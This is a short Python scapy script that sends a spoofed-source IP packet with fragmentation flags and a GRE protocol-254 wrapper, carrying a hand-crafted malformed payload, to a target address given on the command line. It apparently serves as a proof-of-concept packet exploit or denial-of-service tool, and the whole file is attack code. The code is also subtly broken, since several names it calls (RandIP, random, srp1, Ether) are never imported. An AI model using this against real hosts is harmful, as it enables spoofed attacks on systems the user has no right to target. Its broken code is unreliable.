#! /usr/bin/env python

import sys
from scapy.all import sr1,IP,GRE

payload = "\x83\x1b\x01\x06\x12\x01\xff\x07\xff\xff" +"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff" + "\xff\xff\xff\xff\xff\xff\x01\x07\x00\x00"

dst_ip=sys.argv[1]
if len(sys.argv) > 2:
    src_ip=sys.argv[2]
else:
    src_ip= RandIP()

if len(sys.argv) > 3:
    amount=sys.argv[3]

ip_packet = IP(ihl = 5, src = src_ip, dst = dst_ip, ttl = 64 * random.randint(1, 2), frag = 64)
gre_packet = GRE(proto=254)

srp1(Ether() / ip_packet / gre_packet / payload, iface="eth0")



